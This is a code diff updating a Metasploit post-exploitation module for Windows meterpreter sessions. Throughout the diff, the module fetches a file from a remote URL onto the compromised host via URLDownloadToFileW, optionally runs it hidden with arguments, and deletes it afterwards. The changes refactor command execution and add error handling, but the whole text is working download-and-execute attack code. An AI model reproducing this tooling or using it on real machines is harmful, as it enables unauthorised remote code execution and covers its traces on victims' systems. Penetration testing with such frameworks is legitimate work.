@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
@@ -12,9 +8,12 @@
 require 'msf/core'
 require 'rex'
 require 'msf/core/post/file'
+require 'msf/core/post/common'
 
 class Metasploit3 < Msf::Post
+
 	include Msf::Post::File
+	include Msf::Post::Common
 
 	def initialize(info={})
 		super(update_info(info,
@@ -24,7 +23,6 @@ class Metasploit3 < Msf::Post
 				The user may also choose to execute the file with arguments via exec_string.
 			},
 			'License'              => MSF_LICENSE,
-			'Version'              => '$Revision$',
 			'Platform'             => ['windows'],
 			'SessionTypes'         => ['meterpreter'],
 			'Author'               => ['RageLtMan']
@@ -35,14 +33,14 @@ class Metasploit3 < Msf::Post
 				OptString.new('URL',           [true, 'Full URL of file to download' ]),
 				OptString.new('DOWNLOAD_PATH', [false, 'Full path for downloaded file' ]),
 				OptString.new('FILENAME',      [false, 'Name for downloaded file' ]),
-				OptBool.new(  'OUTPUT',        [false, 'Show execution output', true ]),
-				OptBool.new(  'EXECUTE',       [false, 'Execute file after completion', false ]),
+				OptBool.new(  'OUTPUT',        [true, 'Show execution output', true ]),
+				OptBool.new(  'EXECUTE',       [true, 'Execute file after completion', false ]),
 			], self.class)
 
 		register_advanced_options(
 			[
 				OptString.new('EXEC_STRING',   [false, 'Execution parameters when run from download directory' ]),
-				OptBool.new(  'DELETE',        [false, 'Delete file after execution', false ]),
+				OptBool.new(  'DELETE',        [true, 'Delete file after execution', false ]),
 			], self.class)
 
 	end
@@ -53,26 +51,20 @@ class Metasploit3 < Msf::Post
 
 		if client.railgun.dlls.find_all {|d| d.first == 'urlmon'}.empty?
 			session.railgun.add_dll('urlmon','urlmon')
-			session.railgun.add_function('urlmon', 'URLDownloadToFileW', 'DWORD', [
-			['PBLOB', 'pCaller', 'in'],['PWCHAR','szURL','in'],['PWCHAR','szFileName','in'],['DWORD','dwReserved','in'],['PBLOB','lpfnCB','inout']
-		])
-			print_good("urlmon loaded and configured") if datastore['VERBOSE']
+			session.railgun.add_function(
+				'urlmon', 'URLDownloadToFileW', 'DWORD',
+					[
+						['PBLOB', 'pCaller', 'in'],
+						['PWCHAR','szURL','in'],
+						['PWCHAR','szFileName','in'],
+						['DWORD','dwReserved','in'],
+						['PBLOB','lpfnCB','inout']
+			])
+			vprint_good("urlmon loaded and configured")
 		else
-			print_status("urlmon already loaded") if datastore['VERBOSE']
+			vprint_status("urlmon already loaded")
 		end
 
-	end
-
-	def run_cmd(cmd)
-		process = session.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
-		res = ""
-		while (d = process.channel.read)
-			break if d == ""
-			res << d
-		end
-		process.channel.close
-		process.close
-		return res
 	end
 
 	def run
@@ -87,41 +79,61 @@ class Metasploit3 < Msf::Post
 		# check/set vars
 		url = datastore["URL"]
 		filename = datastore["FILENAME"] || url.split('/').last
-		path = session.fs.file.expand_path(datastore["DOWNLOAD_PATH"]) || session.fs.file.expand_path("%TEMP%")
+
+		download_path = session.fs.file.expand_path(datastore["DOWNLOAD_PATH"])
+		if download_path.nil? or download_path.empty?
+			path = session.fs.file.expand_path("%TEMP%")
+		else
+			path = download_path
+		end
+
 		outpath = path + '\\' + filename
 		exec = datastore["EXECUTE"]
-		exec_string = datastore["EXEC_STRING"]
+		exec_string = datastore["EXEC_STRING"] || ''
 		output = datastore['OUTPUT']
 		remove = datastore['DELETE']
-
 
 		# set up railgun
 		add_railgun_urlmon
 
 		# get our file
-		print_status("\tDownloading #{url} to #{outpath}") if datastore['VERBOSE']
+		vprint_status("Downloading #{url} to #{outpath}")
 		client.railgun.urlmon.URLDownloadToFileW(nil,url,outpath,0,nil)
 
 		# check our results
-		out = session.fs.file.stat(outpath)
+		begin
+			out = session.fs.file.stat(outpath)
+			print_status("#{out.stathash['st_size']} bytes downloaded to #{outpath} in #{(Time.now - strtime).to_i} seconds ")
+		rescue
+			print_error("File not found. The download probably failed")
+			return
+		end
 
-		print_status("\t#{out.stathash['st_size']} bytes downloaded to #{outpath} in #{(Time.now - strtime).to_i} seconds ")
-
-		# run our command
+		# Execute file upion request
 		if exec
-			cmd = outpath + ' ' + exec_string
-			res = run_cmd(cmd)
-			print_good(res) if output
+			begin
+				cmd = outpath + ' ' + exec_string
 
-					# remove file if needed
-			if remove
-				print_status("\tDeleting #{outpath}") if datastore['VERBOSE']
-				session.fs.file.rm(outpath)
+				# If we don't have the following gsub, we get this error in Windows:
+				# "Operation failed: The system cannot find the file specified"
+				cmd = cmd.gsub(/\\/, '\\\\\\')
+
+				print_status("Executing file: #{cmd}")
+				res = cmd_exec(cmd)
+				print_good(res) if output and not res.empty?
+			rescue ::Exception => e
+				print_error("Unable to execute: #{e.message}")
 			end
 		end
 
-
-
+		# remove file if needed
+		if remove
+			begin
+				print_status("Deleting #{outpath}")
+				session.fs.file.rm(outpath)
+			rescue ::Exception => e
+				print_error("Unable to remove file: #{e.message}")
+			end
+		end
 	end
 end
-
